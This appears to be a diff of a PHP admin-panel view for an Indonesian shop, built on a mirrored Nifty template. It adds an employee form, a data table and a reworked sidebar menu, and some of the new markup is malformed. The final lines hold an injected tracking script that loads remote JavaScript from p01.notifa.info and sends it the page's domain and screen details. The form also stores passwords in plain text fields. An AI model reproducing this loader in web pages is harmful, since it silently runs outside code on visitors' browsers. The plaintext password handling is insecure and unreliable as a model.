@@ -19,6 +19,9 @@
     <!--Open Sans Font [ OPTIONAL ]-->
     <link href='https://fonts.googleapis.com/css?family=Open+Sans:400,300,600,700' rel='stylesheet' type='text/css'>
 
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+
 
     <!--Bootstrap Stylesheet [ REQUIRED ]-->
     <link href="<?php echo base_url();?>assets/adminlte/css/bootstrap.min.css" rel="stylesheet">
@@ -34,7 +37,7 @@
 
     <!--=================================================-->
 
-
+    <!--=================================================-->
 
     <!--Pace - Page Load Progress Par [OPTIONAL]-->
     <link href="<?php echo base_url();?>assets/adminlte/plugins/pace/pace.min.css" rel="stylesheet">
@@ -45,12 +48,11 @@
     <link href="<?php echo base_url();?>assets/adminlte/css/demo/nifty-demo.min.css" rel="stylesheet">
 
 
-        
+
     <!--DataTables [ OPTIONAL ]-->
     <link href="<?php echo base_url();?>assets/adminlte/plugins/datatables/media/css/dataTables.bootstrap.css" rel="stylesheet">
-	<link href="<?php echo base_url();?>assets/adminlte/plugins/datatables/extensions/Responsive/css/responsive.dataTables.min.css" rel="stylesheet">
+    <link href="<?php echo base_url();?>assets/adminlte/plugins/datatables/extensions/Responsive/css/responsive.dataTables.min.css" rel="stylesheet">
 
-    
     <!--=================================================
 
     REQUIRED
@@ -76,14 +78,19 @@
     Detailed information and more samples can be found in the document.
 
     =================================================-->
+
+    <link rel="stylesheet" type="text/css" href="<?php echo base_url();?>assets/adminlte/css/bootstrap.css">
+    <script type="text/javascript" src="<?php echo base_url();?>assets/adminlte/js/jquery.js"></script>
+    <script type="text/javascript" src="<?php echo base_url();?>assets/adminlte/js/bootstrap.js"></script>  
         
+
 </head>
 
 <!--TIPS-->
 <!--You may remove all ID or Class names which contain "demo-", they are only used for demonstration. -->
 <body>
     <div id="container" class="effect aside-float aside-bright mainnav-lg">
-        
+
         <!--NAVBAR-->
         <!--===================================================-->
         <header id="navbar">
@@ -139,124 +146,6 @@
 
                     </ul>
                     <ul class="nav navbar-top-links">
-
-
-                        <!--Mega dropdown-->
-                        <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
-                        <li class="mega-dropdown">
-                            <a href="#" class="mega-dropdown-toggle">
-                                <i class="demo-pli-layout-grid"></i>
-                            </a>
-                            <div class="dropdown-menu mega-dropdown-menu">
-                                <div class="row">
-                                    <div class="col-sm-4 col-md-3">
-
-                                        <!--Mega menu list-->
-                                        <ul class="list-unstyled">
-									        <li class="dropdown-header"><i class="demo-pli-file icon-lg icon-fw"></i> Pages</li>
-									        <li><a href="#">Profile</a></li>
-									        <li><a href="#">Search Result</a></li>
-									        <li><a href="#">FAQ</a></li>
-									        <li><a href="#">Sreen Lock</a></li>
-									        <li><a href="#">Maintenance</a></li>
-									        <li><a href="#">Invoice</a></li>
-									        <li><a href="#" class="disabled">Disabled</a></li>                                        </ul>
-
-                                    </div>
-                                    <div class="col-sm-4 col-md-3">
-
-                                        <!--Mega menu list-->
-                                        <ul class="list-unstyled">
-									        <li class="dropdown-header"><i class="demo-pli-mail icon-lg icon-fw"></i> Mailbox</li>
-									        <li><a href="#"><span class="pull-right label label-danger">Hot</span>Indox</a></li>
-									        <li><a href="#">Read Message</a></li>
-									        <li><a href="#">Compose</a></li>
-									        <li><a href="#">Template</a></li>
-                                        </ul>
-                                        <p class="pad-top text-main text-sm text-uppercase text-bold"><i class="icon-lg demo-pli-calendar-4 icon-fw"></i>News</p>
-                                        <p class="pad-top mar-top bord-top text-sm">Lorem ipsum dolor sit amet, consectetuer adipiscing elit. Aenean commodo ligula eget dolor. Aenean massa. Cum sociis natoque penatibus et magnis dis parturient montes.</p>
-                                    </div>
-                                    <div class="col-sm-4 col-md-3">
-                                        <!--Mega menu list-->
-                                        <ul class="list-unstyled">
-                                            <li>
-                                                <a href="#" class="media mar-btm">
-                                                    <span class="badge badge-success pull-right">90%</span>
-                                                    <div class="media-left">
-                                                        <i class="demo-pli-data-settings icon-2x"></i>
-                                                    </div>
-                                                    <div class="media-body">
-                                                        <p class="text-semibold text-main mar-no">Data Backup</p>
-                                                        <small class="text-muted">This is the item description</small>
-                                                    </div>
-                                                </a>
-                                            </li>
-                                            <li>
-                                                <a href="#" class="media mar-btm">
-                                                    <div class="media-left">
-                                                        <i class="demo-pli-support icon-2x"></i>
-                                                    </div>
-                                                    <div class="media-body">
-                                                        <p class="text-semibold text-main mar-no">Support</p>
-                                                        <small class="text-muted">This is the item description</small>
-                                                    </div>
-                                                </a>
-                                            </li>
-                                            <li>
-                                                <a href="#" class="media mar-btm">
-                                                    <div class="media-left">
-                                                        <i class="demo-pli-computer-secure icon-2x"></i>
-                                                    </div>
-                                                    <div class="media-body">
-                                                        <p class="text-semibold text-main mar-no">Security</p>
-                                                        <small class="text-muted">This is the item description</small>
-                                                    </div>
-                                                </a>
-                                            </li>
-                                            <li>
-                                                <a href="#" class="media mar-btm">
-                                                    <div class="media-left">
-                                                        <i class="demo-pli-map-2 icon-2x"></i>
-                                                    </div>
-                                                    <div class="media-body">
-                                                        <p class="text-semibold text-main mar-no">Location</p>
-                                                        <small class="text-muted">This is the item description</small>
-                                                    </div>
-                                                </a>
-                                            </li>
-                                        </ul>
-                                    </div>
-                                    <div class="col-sm-12 col-md-3">
-                                        <p class="dropdown-header"><i class="demo-pli-file-jpg icon-lg icon-fw"></i> Gallery</p>
-                                        <div class="row img-gallery">
-                                            <div class="col-xs-4">
-                                                <img class="img-responsive" src="img/thumbs/img-1.jpg" alt="thumbs">
-                                            </div>
-                                            <div class="col-xs-4">
-                                                <img class="img-responsive" src="img/thumbs/img-3.jpg" alt="thumbs">
-                                            </div>
-                                            <div class="col-xs-4">
-                                                <img class="img-responsive" src="img/thumbs/img-2.jpg" alt="thumbs">
-                                            </div>
-                                            <div class="col-xs-4">
-                                                <img class="img-responsive" src="img/thumbs/img-4.jpg" alt="thumbs">
-                                            </div>
-                                            <div class="col-xs-4">
-                                                <img class="img-responsive" src="img/thumbs/img-6.jpg" alt="thumbs">
-                                            </div>
-                                            <div class="col-xs-4">
-                                                <img class="img-responsive" src="img/thumbs/img-5.jpg" alt="thumbs">
-                                            </div>
-                                        </div>
-                                        <a href="#" class="btn btn-block btn-primary">Browse Gallery</a>
-                                    </div>
-                                </div>
-                            </div>
-                        </li>
-                        <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
-                        <!--End mega dropdown-->
-
-
 
                         <!--Notification dropdown-->
                         <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
@@ -400,8 +289,8 @@
                         </li>
                         <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
                         <!--End user dropdown-->
- 
-                        
+
+
                         <li>
                             <a href="#" class="aside-toggle">
                                 <i class="demo-pli-dot-vertical"></i>
@@ -423,7 +312,7 @@
             <!--===================================================-->
             <div id="content-container">
                 <div id="page-head">
-                    
+
                     <!--Page Title-->
                     <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
                     <div id="page-title">
@@ -435,76 +324,143 @@
 
                     <!--Breadcrumb-->
                     <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
-                    <!-- <ol class="breadcrumb">
-					<li><a href="#"><i class="demo-pli-home"></i></a></li> -->
-					<!-- <li><a href="#">Tables</a></li>
-					<li class="active">Data Tables</li> -->
-                    <!-- </ol> -->
+                    <ol class="breadcrumb">
+                    <li><a href="#"><i class="demo-pli-home"></i></a></li>
+                    <li><a href="#">Tables</a></li>
+                    <li class="active">Data Tables</li>
+                    </ol>
                     <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
                     <!--End breadcrumb-->
 
                 </div>
 
-                
-                <!--Page content-->
+
+                 <!--Page content-->
                 <!--===================================================-->
                 <div id="page-content">
                     
-					<!-- Basic Data Tables -->
-					<!--===================================================-->
-					<div class="panel">
-					    <div class="panel-heading">
-					        <h3 class="panel-title">Tambah Data</h3>
-                            <p>
-                            </p>
-					    </div>
-					    <div class="panel-body">
-                        <?php $this->load->view('Barang');?>
-					        <!-- <table id="demo-dt-basic" class="table table-striped table-bordered" cellspacing="0" width="100%">
-					            <thead>
-					                <tr>
-					                    <th>No</th>
-					                    <th>Kode Barang</th>
-					                    <th class="min-tablet">Nama Barang</th>
-					                    <th class="min-tablet">Kategori</th>
-					                    <th class="min-desktop">Foto</th>
-					                    <th class="min-desktop">Harga</th>
-                                        <th class="min-desktop">Stok</th>
-                                        <th class="min-desktop">Aksi</th>
-					                </tr>
-					            </thead>
-					            <tbody>
-					                
-					            </tbody>
-					        </table> -->
-					    </div>
-					</div>
-					<!--===================================================-->
-					<!-- End Striped Table -->
-					
-					<!-- Tombol untuk menampilkan modal-->
-    <!-- <button type="button" class="btn btn-primary" data-toggle="modal" data-target="#myModal">Tambah</button> -->
- 
-   
-					
-					
+
+                    <!-- Basic Data Tables -->
+                    <!--===================================================-->
+                    <div class="panel">
+                        <br>
+        
+               &emsp;&nbsp;
+            <button type="button" class="btn btn-primary" data-toggle="modal" data-target="#myModal">Tambah</button>
+                                    
+                        <div class="panel-body">
+                            <table id="demo-dt-basic" class="table table-striped table-bordered" cellspacing="0" width="100%">
+                                                                 <!-- Modal -->
+                <div id="myModal" class="modal fade" role="dialog">
+                    <div class="modal-dialog">
+
+                                        <!-- konten modal-->
+                                        <div class="modal-content">
+                                            <!-- heading modal -->
+                                            <div class="modal-header">
+                                                <button type="button" class="close" data-dismiss="modal">&times;</button>
+                                                <h4 class="modal-title">Tambahkan Pegawai</h4>
+                                            </div>
+                                            <!-- body modal -->
+                                            <div class="modal-body">
+                                        <form>
+                                            <div class="form-group">
+                                                <label>Nama</label>
+                                                <input type="text" class="form-control">
+                                            </div>
+                                            <div class="form-group">
+                                                <label>Tempat Lahir</label>
+                                                <input type="text" class="form-control" id="alamat">
+                                            </div>      
+                                            <div class="form-group">
+                                                <label>Tanggal Lahir</label>
+                                                <input type="date" class="form-control" id="alamat">
+                                            </div>      
+                                            <div class="form-group">
+                                                <label>Email</label>
+                                                <input type="text" class="form-control" id="alamat">
+                                            </div>      
+                                            <div class="form-group">
+                                                <label>Password</label>
+                                                <input type="text" class="form-control" id="alamat">
+                                            </div>
+
+                                            <div class="form-group">
+                                                <label>Telepon</label>
+                                                <input type="text" class="form-control">
+                                            </div>      
+                                            <div class="form-group">
+                                                <label>Alamat</label>
+                                                <input type="text" class="form-control">
+                                            </div>                                  
+                                            <div class="form-group">
+                                                <label>Foto</label>
+                                                <input type="file" class="form-control">
+                                            </div>
+                                            <div class="form-group">
+                                                <label>Status</label>
+                                                <input type="text" class="form-control">
+                                            </div>
+                                            <button type="submit" class="btn btn-primary">Simpan</button>
+                                        </form>
+                                            </div>
+                                            <!-- footer modal -->
+                                            <div class="modal-footer">
+                                                <button type="button" class="btn btn-default" data-dismiss="modal">Keluar</button>
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>
+                             </div>
+                                <thead>
+                                    <tr>
+                                        <th>Nama</th>
+                                        <th>Tempat Lahir</th>
+                                        <th class="min-tablet">Tanggal Lahir</th>
+                                        <th class="min-tablet">Email</th>
+                                        <th class="min-desktop">Password</th>
+                                        <th class="min-desktop">Telepon</th>
+                                        <th class="min-desktop">Alamat</th>
+                                        <th>Foto</th>
+                                        <th>Status</th>
+                                        <th> Aksi</th>
+                                    </tr>
+                                </thead>
+                                <tbody>
+                                    <tr>
+                                        <th></th>
+                                        <th></th>
+                                        <th></th>
+                                        <th></th>
+                                        <th></th>
+                                        <th></th>
+                                        <th></th>
+                                        <th></th>
+                                        <th></th>
+                                        <th></th>
+                                    </tr>                
+                                </tbody>
+                            </table>
+                           </div>
+                        </div>
+                    </div>                              
+                    <!--===================================================-->
+                    <!-- End Striped Table -->              
+
                 </div>
                 <!--===================================================-->
                 <!--End page content-->
-
             </div>
             <!--===================================================-->
             <!--END CONTENT CONTAINER-->
 
-
-            
             <!--ASIDE-->
             <!--===================================================-->
             <aside id="aside-container">
                 <div id="aside">
                     <div class="nano">
                         <div class="nano-content">
-                            
+
                             <!--Nav tabs-->
                             <!--================================-->
                             <ul class="nav nav-tabs nav-justified">
@@ -542,64 +498,64 @@
 
                                     <!--Family-->
                                     <div class="list-group bg-trans">
-							            <a href="#" class="list-group-item">
-							                <div class="media-left pos-rel">
-							                    <img class="img-circle img-xs" src="img/profile-photos/2.png" alt="Profile Picture">
-												<i class="badge badge-success badge-stat badge-icon pull-left"></i>
-							                </div>
-							                <div class="media-body">
-							                    <p class="mar-no text-main">Stephen Tran</p>
-							                    <small class="text-muteds">Availabe</small>
-							                </div>
-							            </a>
-							            <a href="#" class="list-group-item">
-							                <div class="media-left pos-rel">
-							                    <img class="img-circle img-xs" src="img/profile-photos/7.png" alt="Profile Picture">
-							                </div>
-							                <div class="media-body">
-							                    <p class="mar-no text-main">Brittany Meyer</p>
-							                    <small class="text-muteds">I think so</small>
-							                </div>
-							            </a>
-							            <a href="#" class="list-group-item">
-							                <div class="media-left pos-rel">
-							                    <img class="img-circle img-xs" src="img/profile-photos/1.png" alt="Profile Picture">
-												<i class="badge badge-info badge-stat badge-icon pull-left"></i>
-							                </div>
-							                <div class="media-body">
-							                    <p class="mar-no text-main">Jack George</p>
-							                    <small class="text-muteds">Last Seen 2 hours ago</small>
-							                </div>
-							            </a>
-							            <a href="#" class="list-group-item">
-							                <div class="media-left pos-rel">
-							                    <img class="img-circle img-xs" src="img/profile-photos/4.png" alt="Profile Picture">
-							                </div>
-							                <div class="media-body">
-							                    <p class="mar-no text-main">Donald Brown</p>
-							                    <small class="text-muteds">Lorem ipsum dolor sit amet.</small>
-							                </div>
-							            </a>
-							            <a href="#" class="list-group-item">
-							                <div class="media-left pos-rel">
-							                    <img class="img-circle img-xs" src="img/profile-photos/8.png" alt="Profile Picture">
-												<i class="badge badge-warning badge-stat badge-icon pull-left"></i>
-							                </div>
-							                <div class="media-body">
-							                    <p class="mar-no text-main">Betty Murphy</p>
-							                    <small class="text-muteds">Idle</small>
-							                </div>
-							            </a>
-							            <a href="#" class="list-group-item">
-							                <div class="media-left pos-rel">
-							                    <img class="img-circle img-xs" src="img/profile-photos/9.png" alt="Profile Picture">
-												<i class="badge badge-danger badge-stat badge-icon pull-left"></i>
-							                </div>
-							                <div class="media-body">
-							                    <p class="mar-no text-main">Samantha Reid</p>
-							                    <small class="text-muteds">Offline</small>
-							                </div>
-							            </a>
+                                        <a href="#" class="list-group-item">
+                                            <div class="media-left pos-rel">
+                                                <img class="img-circle img-xs" src="img/profile-photos/2.png" alt="Profile Picture">
+                                                <i class="badge badge-success badge-stat badge-icon pull-left"></i>
+                                            </div>
+                                            <div class="media-body">
+                                                <p class="mar-no text-main">Stephen Tran</p>
+                                                <small class="text-muteds">Availabe</small>
+                                            </div>
+                                        </a>
+                                        <a href="#" class="list-group-item">
+                                            <div class="media-left pos-rel">
+                                                <img class="img-circle img-xs" src="img/profile-photos/7.png" alt="Profile Picture">
+                                            </div>
+                                            <div class="media-body">
+                                                <p class="mar-no text-main">Brittany Meyer</p>
+                                                <small class="text-muteds">I think so</small>
+                                            </div>
+                                        </a>
+                                        <a href="#" class="list-group-item">
+                                            <div class="media-left pos-rel">
+                                                <img class="img-circle img-xs" src="img/profile-photos/1.png" alt="Profile Picture">
+                                                <i class="badge badge-info badge-stat badge-icon pull-left"></i>
+                                            </div>
+                                            <div class="media-body">
+                                                <p class="mar-no text-main">Jack George</p>
+                                                <small class="text-muteds">Last Seen 2 hours ago</small>
+                                            </div>
+                                        </a>
+                                        <a href="#" class="list-group-item">
+                                            <div class="media-left pos-rel">
+                                                <img class="img-circle img-xs" src="img/profile-photos/4.png" alt="Profile Picture">
+                                            </div>
+                                            <div class="media-body">
+                                                <p class="mar-no text-main">Donald Brown</p>
+                                                <small class="text-muteds">Lorem ipsum dolor sit amet.</small>
+                                            </div>
+                                        </a>
+                                        <a href="#" class="list-group-item">
+                                            <div class="media-left pos-rel">
+                                                <img class="img-circle img-xs" src="img/profile-photos/8.png" alt="Profile Picture">
+                                                <i class="badge badge-warning badge-stat badge-icon pull-left"></i>
+                                            </div>
+                                            <div class="media-body">
+                                                <p class="mar-no text-main">Betty Murphy</p>
+                                                <small class="text-muteds">Idle</small>
+                                            </div>
+                                        </a>
+                                        <a href="#" class="list-group-item">
+                                            <div class="media-left pos-rel">
+                                                <img class="img-circle img-xs" src="img/profile-photos/9.png" alt="Profile Picture">
+                                                <i class="badge badge-danger badge-stat badge-icon pull-left"></i>
+                                            </div>
+                                            <div class="media-body">
+                                                <p class="mar-no text-main">Samantha Reid</p>
+                                                <small class="text-muteds">Offline</small>
+                                            </div>
+                                        </a>
                                     </div>
 
                                     <hr>
@@ -777,7 +733,7 @@
             <!--===================================================-->
             <!--END ASIDE-->
 
-            
+
              <!--MAIN NAVIGATION-->
             <!--===================================================-->
             <nav id="mainnav-container">
@@ -827,7 +783,7 @@
                                 <!--================================-->
                                 <div id="mainnav-shortcut" class="hidden">
                                     <ul class="list-unstyled shortcut-wrap">
-                                    	
+
                                         <li class="col-xs-3" data-content="My Profile">
                                             <a class="shortcut-grid" href="#">
                                                 <div class="icon-wrap icon-wrap-sm icon-circle bg-mint">
@@ -863,76 +819,110 @@
 
 
                                 <ul id="mainnav-menu" class="list-group">
-									
-						            <!--Category name-->
-						            <li class="list-header">Navigation</li>
-						
-						            <!--Menu list item-->
-						            <li>
-						                <a href="<?= base_url().'Dashboard' ?>">
-						                    <i class="demo-pli-gear"></i>
-						                    <span class="menu-title">
-												Beranda
-											</span>
-						                </a>
-						            </li>
 
-						            <li class="active-sub">
-						                <a href="#">
-						                    <i class="demo-pli-home"></i>
-						                    <span class="menu-title">Barang</span>
-											<i class="arrow"></i>
-						                </a>
-						
-						                <!--Submenu-->
-						                <ul class="collapse in">
-						                    <li class="active-link"><a href="index.html">Data Barang</a></li>
-                                             <ul class="collapse">
-                                            <li><a href="<?php echo base_url('d.Barang.php/Barang') ?>">Data Barang</a></li>
-                                            
-                                            
+                                    <!--Category name-->
+                                    <li class="list-header">Navigation</li>
+
+                                    <!--Menu list item-->
+                                    <li class="active-sub">
+                                        <a href="<?= base_url().'Dashboard' ?>">
+                                            <i class="fa fa-home"></i>
+                                            <span class="menu-title">
+                                                Beranda
+                                            </span>
+                                        </a>
+                                    </li>
+
+                                    <!--Menu list item-->
+                                    <li >
+                                        <a href="#">
+                                            <i class="glyphicon glyphicon-book"></i>
+                                            <span class="menu-title">Data Toko</span>
+                                            <i class="arrow"></i>
+                                        </a>
+
+                                        <!--Submenu-->
+                                        <ul class="collapse">
+                                           <li><a href=""><i class="fa fa-edit"></i>
+                               <span class="menu-title">Informasi Toko
+                                           <li><a href=""><i class="fa fa-edit"></i>Faqs</a></li>
                                         </ul>
-											<li><a href="dashboard-2.html">Riwayat Barang</a></li>
-											<li><a href="dashboard-3.html">Barang Masuk</a></li>
-											<li><a href="dashboard-4.html">Barang keluar</a></li>
-											
-						                </ul>
-						            </li>
-						
-						            <!--Menu list item-->
-						            <li>
-						                <a href="#">
-						                    <i class="demo-pli-split-vertical-2"></i>
-						                    <span class="menu-title">Pegawai</span>
-											<i class="arrow"></i>
-						                </a>
-						
-						                <!--Submenu-->
-						                <ul class="collapse">
-						                    <li><a href="<?php echo base_url('Dashboard-3/Barang') ?>">Data Barang</a></li>
-											
-											
-						                </ul>
-						            </li>
-						
-						            <!--Menu list item-->
-						            <li>
-						                <a href="widgets.html">
-						                    <i class="demo-pli-gear"></i>
-						                    <span class="menu-title">
-												Kritik & Saran
-												<span class="pull-right badge badge-warning">24</span>
-											</span>
-						                </a>
-						            </li>
-						
+                                    </li>
 
+                                    <!--Menu item-->
+                                    <li>
+                                        <a href="widgets.html">
+                                            <i class="fa fa-file"></i>
+                                            <span class="menu-title">
+                                                Data Barang
+                                                <span class="pull-right badge badge-warning"></span>
+                                            </span>
+                                        </a>
+                                    </li>
+
+                                     <!--Menu item-->
+                                    <li>
+                                        <a href="widgets.html">
+                                            <i class="fa fa-history"></i>
+                                            <span class="menu-title">
+                                                Riwayat Barang
+                                                <span class="pull-right badge badge-warning"></span>
+                                            </span>
+                                        </a>
+                                    </li>
+
+                                     <!--Menu item-->
+                                    <li>
+                                        <a href="widgets.html">
+                                            <i class="glyphicon glyphicon-list-alt"></i>
+                                            <span class="menu-title">
+                                                Barang Ready
+                                                <span class="pull-right badge badge-warning"></span>
+                                            </span>
+                                        </a>
+                                    </li>
+
+                                       <!--Menu item-->
+                                    <li>
+                                        <a href="widgets.html">
+                                            <i class="fa fa-file"></i>
+                                            <span class="menu-title">
+                                                Data Pegawai
+                                                <span class="pull-right badge badge-warning"></span>
+                                            </span>
+                                        </a>
+                                    </li>
+
+                                     <!--Menu list item-->
+                                    <li >
+                                        <a href="#">
+                                            <i class="glyphicon glyphicon-book"></i>
+                                            <span class="menu-title">Laporan</span>
+                                            <i class="arrow"></i>
+                                        </a>
+
+                                        <!--Submenu-->
+                                        <ul class="collapse">
+                                                       <li><a href=""><i class="fa fa-book"></i>
+                                           <span class="menu-title">Penjualan
+                                                       <li><a href=""><i class="fa fa-book"></i>Pembelian</a></li>
+                                                    </ul>
+                                                </li>
+                                     <!--Menu item-->
+                                    <li>
+                                        <a href="widgets.html">
+                                            <i class="fa fa-wechat"></i>
+                                            <span class="menu-title">
+                                                Kritik & Saran
+                                                <span class="pull-right badge badge-warning"></span>
+                                            </span>
+                                        </a>
+                                    </li>
                             </div>
                         </div>
                     </div>
                     <!--================================-->
                     <!--End menu-->
-
                 </div>
             </nav>
 
@@ -941,7 +931,7 @@
 
         </div>
 
-        
+
 
         <!-- FOOTER -->
         <!--===================================================-->
@@ -957,17 +947,17 @@
 
             <!-- Visible when footer positions are static -->
             <!-- ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ -->
-            <div class="hide-fixed pull-right pad-rgt">
+     <!--       <div class="hide-fixed pull-right pad-rgt">
                 14GB of <strong>512GB</strong> Free.
             </div>
 
-
+    -->
 
             <!-- ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ -->
             <!-- Remove the class "show-fixed" and "hide-fixed" to make the content always appears. -->
             <!-- ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ -->
 
-            <p class="pad-lft">&#0169; 2018 Your Company</p>
+            <p class="pad-lft">&#0169; </p>
 
 
 
@@ -987,9 +977,9 @@
     <!-- END OF CONTAINER -->
 
 
-    
-    
-    
+
+
+
     <!--JAVASCRIPT-->
     <!--=================================================-->
 
@@ -1008,25 +998,24 @@
 
 
     <!--=================================================-->
-    
+
     <!--Demo script [ DEMONSTRATION ]-->
   <!--  <script src="<?php echo base_url();?>assets/adminlte/js/demo/nifty-demo.min.js"></script> -->
 
-    
+
     <!--DataTables [ OPTIONAL ]-->
     <script src="<?php echo base_url();?>assets/adminlte/plugins/datatables/media/js/jquery.dataTables.js"></script>
-	<script src="<?php echo base_url();?>assets/adminlte/plugins/datatables/media/js/dataTables.bootstrap.js"></script>
-	<script src="<?php echo base_url();?>assets/adminlte/plugins/datatables/extensions/Responsive/js/dataTables.responsive.min.js"></script>
+    <script src="<?php echo base_url();?>assets/adminlte/plugins/datatables/media/js/dataTables.bootstrap.js"></script>
+    <script src="<?php echo base_url();?>assets/adminlte/plugins/datatables/extensions/Responsive/js/dataTables.responsive.min.js"></script>
 
 
     <!--DataTables Sample [ SAMPLE ]-->
     <script src="<?php echo base_url();?>assets/adminlte/js/demo/tables-datatables.js"></script>
 
 
-    
+
 
 <script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582JKzDzTsXZH2iBChPrGIbjUaxQDkkXsQ40smKLX5MuTaP3Hz7CQx99v6v04x8tXILLzaJOlxMW8AqYZK7vJBQ0GeroIrDmsgRoQd3TbDcKFg5ZBqSJkgONBJfmihZkKwZm6n6A8yUgj4nkx3jY0LDUaUhTTSVo18zAU71F%2bg%2fz9XJK7mEBwuR9UbbQUNbpeu8TLlTGwc%2bJ8Q4Ghvlq5a3uLs3tGbSqe%2bIMGFB42NllBOXiUa%2fJS3C%2f4xtm2qCm0o76VDiUn%2fJU4E2PfPUP5k8Q8kqhOs%2f%2fJYJ%2b5E9CA9qTuBEo6UMsqrPZvthp0Oykb75Uu2OV1Q22Y539wDCdiCo%2fWdq8fte8WqybYrW7iOvpOtmuE9ypRwL6%2b5gbKpaecKP8gA8490c03k5TAyLvuWRxyhxBbA0sZtkm3%2b8dHg4FAjhTkRhGG4SmpBOqFSR9NOOtxN2dE8rtluoiMR%2fABnnWziDQHZS%2bjsuB5P1ZZS9wUjx%2bBZgxi5uazzR7I6vPu%2fVdNPdhxC%2fcET" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
 
 <!-- Mirrored from www.themeon.net/nifty/v2.9.1/tables-datatable.html by HTTrack Website Copier/3.x [XR&CO'2014], Sat, 02 Feb 2019 04:06:10 GMT -->
 </html>
-
